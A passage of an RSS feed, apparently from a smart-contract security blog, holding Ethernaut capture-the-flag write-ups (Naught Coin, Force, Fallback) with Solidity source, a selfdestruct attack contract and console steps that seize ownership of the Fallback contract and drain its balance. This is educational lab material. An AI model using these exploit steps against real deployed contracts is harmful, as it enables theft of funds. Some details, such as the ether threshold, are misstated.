&lt;li>&lt;a href="https://www.youtube.com/playlist?list=PLZa7COjIxKWzLcMxI9cRNSzOtdR0xvXB7">Smart Contract Security - Educational YouTube Series in Greek - Click Here&lt;/a>&lt;/li>
&lt;/ul></content></item><item><title>Naught Coin - Ethernaut</title><link>/blockchain_writeups/naught-coin/</link><pubDate>Thu, 06 Jan 2022 00:00:00 +0000</pubDate><guid>/blockchain_writeups/naught-coin/</guid><description>So now we have the challenge &amp;ldquo;Naught Coin&amp;rdquo;. Naught Coin is an ERC20 token and we are already holding all of them. The catch is that we will only be able to transfer them after a 10 year lockout period. Can we figure out how to get them out to another address so that we can transfer them freely? So, we have NaughtCoins locked for a 10 year period. We have to unlock them and then, get them to an another address.</description><content>&lt;p>So now we have the challenge &amp;ldquo;Naught Coin&amp;rdquo;. Naught Coin is an ERC20 token and we are already holding all of them.
The catch is that we will only be able to transfer them after a 10 year lockout period. Can we figure out how to get them out to another address so that we can transfer them freely?
So, we have NaughtCoins locked for a 10 year period. We have to unlock them and then, get them to an another address. Let&amp;rsquo;s check the code&lt;/p>
&lt;pre tabindex="0">&lt;code>// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import &amp;#39;@openzeppelin/contracts/token/ERC20/ERC20.sol&amp;#39;;
contract NaughtCoin is ERC20 {
// string public constant name = &amp;#39;NaughtCoin&amp;#39;;
// string public constant symbol = &amp;#39;0x0&amp;#39;;
// uint public constant decimals = 18;
uint public timeLock = now + 10 * 365 days;
uint256 public INITIAL_SUPPLY;
address public player;
constructor(address _player)
ERC20(&amp;#39;NaughtCoin&amp;#39;, &amp;#39;0x0&amp;#39;)
public {
player = _player;
INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));
// _totalSupply = INITIAL_SUPPLY;
// _balances[player] = INITIAL_SUPPLY;
_mint(player, INITIAL_SUPPLY);
emit Transfer(address(0), player, INITIAL_SUPPLY);
}
function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {
super.transfer(_to, _value);
}
// Prevent the initial owner from transferring tokens until the timelock has passed
modifier lockTokens() {
if (msg.sender == player) {
require(now &amp;gt; timeLock);
_;
} else {
_;
}
}
}
&lt;/code>&lt;/pre>&lt;p>First of all, we should mention some features of the interfaces:&lt;/p>
&lt;ul>
&lt;li>They cannot inherit from other contracts, but they can inherit from other interfaces.&lt;/li>
&lt;li>All declared functions must be external.&lt;/li>
&lt;li>They cannot declare a constructor, state variables or modifiers.&lt;/li>
&lt;li>Contracts can inherit interfaces as they would inherit other contracts.&lt;/li>
&lt;/ul>
&lt;p>So, we can see that the contract NaughtCoin inherits all ERC20 contract functions and standards. As a result, we have to study about how ERC20 tokens are working too.
On ERC20&amp;rsquo;s github repository, we can find more information about its&amp;rsquo; methods. As a result, we have to study about how ERC20 tokens are working too.
&lt;a href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md">https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md&lt;/a>&lt;/p>
&lt;p>We can read that in order for a token to be compatible with the ERC20 specification, it must have implementations for the following interface:&lt;/p>
&lt;pre tabindex="0">&lt;code>contract ERC20Interface {
function totalSupply() public constant returns (uint);
function balanceOf(address tokenOwner) public constant returns (uint balance);
function allowance(address tokenOwner, address spender) public constant returns (uint remaining);
function transfer(address to, uint tokens) public returns (bool success);
function approve(address spender, uint tokens) public returns (bool success);
function transferFrom(address from, address to, uint tokens) public returns (bool success);
event Transfer(address indexed from, address indexed to, uint tokens);
event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}
&lt;/code>&lt;/pre>&lt;p>This specification is one of the most popular, which makes finding further documentation much easier. Maybe we should use some of these functions to transfer the tokens.
To begin identifying where we should look at first, we found that looking at ERC20 interface gave us many methods that we would want to look further into. In particular, the first function that jumped out to us was the transferFrom() function. We had identified that NaughtCoin ‘s transfer implementation was rendered useless by the lockTokens modifier, but NaughtCoin did not implement the transferFrom() function, which means that the StandardToken implementation of transferFrom is being called.
Upon reading the source code of the transferFrom function, it appears that it allows a third party to transfer a designated amount of tokens from one account to another account. This is derived from reading the requirements for transfer.&lt;/p>
&lt;hr>
&lt;p>If you want to learn more about Smart Contract Security, please check our paper and eCourses:&lt;/p>
&lt;h2 id="smart-contract-security">Smart-Contract Security:&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://github.com/sv1sjp/eVoting_Elections_Decentralized_App/blob/main/smartcontract_security_paper.pdf">Smart Contract Security: Dimitris Vagiakakakos, Stavros Gkinos, Ioannis Karvelas&lt;/a>&lt;/li>
&lt;/ul>
&lt;ul>
&lt;li>&lt;a href="https://www.youtube.com/playlist?list=PLZa7COjIxKWzLcMxI9cRNSzOtdR0xvXB7">Smart Contract Security - Educational YouTube Series in Greek - Click Here&lt;/a>&lt;/li>
&lt;/ul></content></item><item><title>Force - Ethernaut</title><link>/blockchain_writeups/force/</link><pubDate>Sun, 02 Jan 2022 00:00:00 +0000</pubDate><guid>/blockchain_writeups/force/</guid><description>We have an empty smart-contract without any functions, constructor or even Fallback Function. Our goal is to send some Ether to it.
Ethereum smart-contracts typically they have 3 ways to receive ether from an another address.
// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract Force {/* MEOW ? /\_/\ / ____/ o o \ /~____ =ø= / (______)__m_m) */} As we have already mentioned, by using a payable function. We don&amp;rsquo;t have any kind of function on this smart-contract so we cannot use this way.</description><content>&lt;p>We have an empty smart-contract without any functions, constructor or even Fallback Function. Our goal is to send some Ether to it.&lt;/p>
&lt;p>Ethereum smart-contracts typically they have 3 ways to receive ether from an another address.&lt;/p>
&lt;pre tabindex="0">&lt;code>// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
contract Force {/*
MEOW ?
/\_/\ /
____/ o o \
/~____ =ø= /
(______)__m_m)
*/}
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>As we have already mentioned, by using a payable function. We don&amp;rsquo;t have any kind of function on this smart-contract so we cannot use this way.&lt;/li>
&lt;li>By receiving mining rewards. A smart-contract can be designed to be able to receive mining block rewards. Maybe it&amp;rsquo;s not the best solution to our problem right now.&lt;/li>
&lt;li>By destroying an other smart-contract using the selfdestruct() method in order to force send all of it&amp;rsquo;s ether to an another address or smart contract. Maybe this method solves our problem.&lt;/li>
&lt;/ul>
&lt;p>So, it&amp;rsquo;s time to create a new smart-contract which has a public payable function on it with a selfdestruct() command.&lt;/p>
&lt;pre tabindex="0">&lt;code>pragma solidity ^0.8.11;
contract SelfDestructingDapp{
constructor() public payable{
}
function attack(address payable _contractAddr) payable public {
selfdestruct(_contractAddr);
}
}
&lt;/code>&lt;/pre>&lt;p>Now, we compile and deploy this smart-contract to Ethereum Blockchain with some amount of ether on it.
Time to call the attack function and give as a parameter the smart-contract&amp;rsquo;s address.
As previously, we use the Console from our web browser to interact with the original smart contract and we type:&lt;/p>
&lt;pre tabindex="0">&lt;code>await contract.address()
&lt;/code>&lt;/pre>&lt;p>As we want to find smart-contract&amp;rsquo;s address, we copy the address and then we give it as a parameter in the attack function on SelfDestructing Dapp.
We wait until the block to be mined and now we can check the balance of the original smart-contract by typing in console:&lt;/p>
&lt;pre tabindex="0">&lt;code>await getBalance(contract.address)
&lt;/code>&lt;/pre>&lt;p>And now we can see that it has the amount of ether that the SelfDestructing Dapp had.
Noticeably, when we use the selfdestruct() function and we send the amount of ether in an another address, if this address is not existing or we sent it to an smart-contract which hasn&amp;rsquo;t any transfer() or withdraw() function, it is lost forever. It is of high importance to not burn ether like this, specially in the mainnet as we loose real world money and deflate the Ethereum Network. Additionally, we should never create a contract which uses as a fallback function with a requirement of some ether but code the contract to support transfer only from the owner. Someone can still use selfdestruct() in order to send an amount of ether to the contract and trigger the fallback function without being the owner.&lt;/p>
&lt;hr>
&lt;p>If you want to learn more about Smart Contract Security, please check our paper and eCourses:&lt;/p>
&lt;h2 id="smart-contract-security">Smart-Contract Security:&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://github.com/sv1sjp/eVoting_Elections_Decentralized_App/blob/main/smartcontract_security_paper.pdf">Smart Contract Security: Dimitris Vagiakakakos, Stavros Gkinos, Ioannis Karvelas&lt;/a>&lt;/li>
&lt;/ul>
&lt;ul>
&lt;li>&lt;a href="https://www.youtube.com/playlist?list=PLZa7COjIxKWzLcMxI9cRNSzOtdR0xvXB7">Smart Contract Security - Educational YouTube Series in Greek - Click Here&lt;/a>&lt;/li>
&lt;/ul></content></item><item><title>Fallback - Ethernaut</title><link>/blockchain_writeups/fallback/</link><pubDate>Sun, 19 Dec 2021 00:00:00 +0000</pubDate><guid>/blockchain_writeups/fallback/</guid><description>We have the smart-contract Fallback and we are requested to claim the ownership of the contract, and then reduce it&amp;rsquo;s balance to 0. At first, let&amp;rsquo;s read the smart contract&amp;rsquo;s code and search if something interesting is going on there:
// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import &amp;#39;@openzeppelin/contracts/math/SafeMath.sol&amp;#39;; contract Fallback { using SafeMath for uint256; mapping(address =&amp;gt; uint) public contributions; address payable public owner; constructor() public { owner = msg.sender; contributions[msg.</description><content>&lt;p>We have the smart-contract Fallback and we are requested to claim the ownership of the contract, and then reduce it&amp;rsquo;s balance to 0.
At first, let&amp;rsquo;s read the smart contract&amp;rsquo;s code and search if something interesting is going on there:&lt;/p>
&lt;pre tabindex="0">&lt;code>// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import &amp;#39;@openzeppelin/contracts/math/SafeMath.sol&amp;#39;;
contract Fallback {
using SafeMath for uint256;
mapping(address =&amp;gt; uint) public contributions;
address payable public owner;
constructor() public {
owner = msg.sender;
contributions[msg.sender] = 1000 * (1 ether);
}
modifier onlyOwner {
require(
msg.sender == owner,
&amp;#34;caller is not the owner&amp;#34;
);
_;
}
function contribute() public payable {
require(msg.value &amp;lt; 0.001 ether);
contributions[msg.sender] += msg.value;
if(contributions[msg.sender] &amp;gt; contributions[owner]) {
owner = msg.sender;
}
}
function getContribution() public view returns (uint) {
return contributions[msg.sender];
}
function withdraw() public onlyOwner {
owner.transfer(address(this).balance);
}
receive() external payable {
require(msg.value &amp;gt; 0 &amp;amp;&amp;amp; contributions[msg.sender] &amp;gt; 0);
owner = msg.sender;
}
}
&lt;/code>&lt;/pre>&lt;p>First of all, let&amp;rsquo;s talk about the constructor. Constructor is an optional function and is used to initialize state variables of a contract. State variables are variables whose values are permanently stored in smart-contract&amp;rsquo;s storage. We have to mention here that each contract can have only one constructor. A constructor code is executed once when a contract is created and it is used to initialize contract state. After a constructor code executed, the final code is deployed to blockchain. Taking this into account, under the deployment of the smart-contract, the constructor runs at first and sets the person who deployed the smart-contract as an owner in the public Boolean variable &amp;ldquo;owner&amp;rdquo;, by the command:&lt;/p>
&lt;pre tabindex="0">&lt;code>owner = msg.sender;
&lt;/code>&lt;/pre>&lt;p>If we type in console:&lt;/p>
&lt;pre tabindex="0">&lt;code>await contract.owner()
&lt;/code>&lt;/pre>&lt;p>We can see the address that deployed this smart contract and by typing:&lt;/p>
&lt;pre tabindex="0">&lt;code>contract.address
&lt;/code>&lt;/pre>&lt;p>We can find the smart-contract&amp;rsquo;s address. Each user and each smart-contract in Ethereum Blockchain has it&amp;rsquo;s own address. If we type &amp;ldquo;player&amp;rdquo; we can find our wallet&amp;rsquo;s address.
So, to begin with, as we want to claim ownership of the smart-contract, we are trying to find out something that sets us as the owner. We can see that there is a receive() external function that if we pass it&amp;rsquo;s requirements, it sets us as the owner of the smart-contract. It looks interesting. From Solidity&amp;rsquo;s documentation, we can find out that receive() is a fallback function that is executed when we create general transactions, without calling a specific function from the contract. The receive() function is executed on a call to the contract with empty calldata. This type of functions cannot have arguments or return anything. We keep this in our minds for now.
The second requirements wants for us to be in the contributions array and having us sent an amount of ether more than 0. We check the contributions array if we are inside on it by calling:&lt;/p>
&lt;pre tabindex="0">&lt;code>await contract.contributions(player)
&lt;/code>&lt;/pre>&lt;p>However, it returns as false. So, let&amp;rsquo;s check the code again to find a way to add ourselves in &amp;ldquo;contributions&amp;rdquo;. We can see that a payable function exists and requires to get an amount of ether smaller than 0.01 ether. We can simply send 1 Wei, the smallest amount of ether that we can send to someone by typing in console:&lt;/p>
&lt;pre tabindex="0">&lt;code>contract.contribute({value:1})
&lt;/code>&lt;/pre>&lt;p>So now we added ourselves in the &amp;ldquo;contributions&amp;rdquo; array. Now we pass the one requirement. It&amp;rsquo;s time to send a small amount of money (1 Wei as the requirement needs to be more than 0) in a generic transaction in order to pass the second requirement in the receive() function and trigger it. We type:&lt;/p>
&lt;pre tabindex="0">&lt;code>contract.sendTransaction({value:1})
&lt;/code>&lt;/pre>&lt;p>After all of this, we can check again who is the owner of the smart-contract and we can see our address on this variable. We successfully own the smart-contract now. Let&amp;rsquo;s reduce it&amp;rsquo;s balance to zero.
The &amp;ldquo;withdraw&amp;rdquo; function can help us with that which can be executed only from the owner of the contract. But now we are the owner. It&amp;rsquo;s time to withdraw all of it&amp;rsquo;s ether. We type in console:&lt;/p>
&lt;pre tabindex="0">&lt;code>contract.withdraw()
&lt;/code>&lt;/pre>&lt;p>And then, let&amp;rsquo;s check the balance of the smart-contract:&lt;/p>
&lt;pre tabindex="0">&lt;code>await getBalance(contract.address)
&lt;/code>&lt;/pre>&lt;p>We will see a balance of 0 on this smart-contract.That means that we successfully withdrawn all of it&amp;rsquo;s ether. We successfully won this game!!!&lt;/p>
&lt;hr>
&lt;p>If you want to learn more about Smart Contract Security, please check our paper and eCourses:&lt;/p>
&lt;h2 id="smart-contract-security">Smart-Contract Security:&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://github.com/sv1sjp/eVoting_Elections_Decentralized_App/blob/main/smartcontract_security_paper.pdf">Smart Contract Security: Dimitris Vagiakakakos, Stavros Gkinos, Ioannis Karvelas&lt;/a>&lt;/li>
&lt;/ul>
&lt;ul>
&lt;li>&lt;a href="https://www.youtube.com/playlist?list=PLZa7COjIxKWzLcMxI9cRNSzOtdR0xvXB7">Smart Contract Security - Educational YouTube Series in Greek - Click Here&lt;/a>&lt;/li>
&lt;/ul></content></item></channel></rss>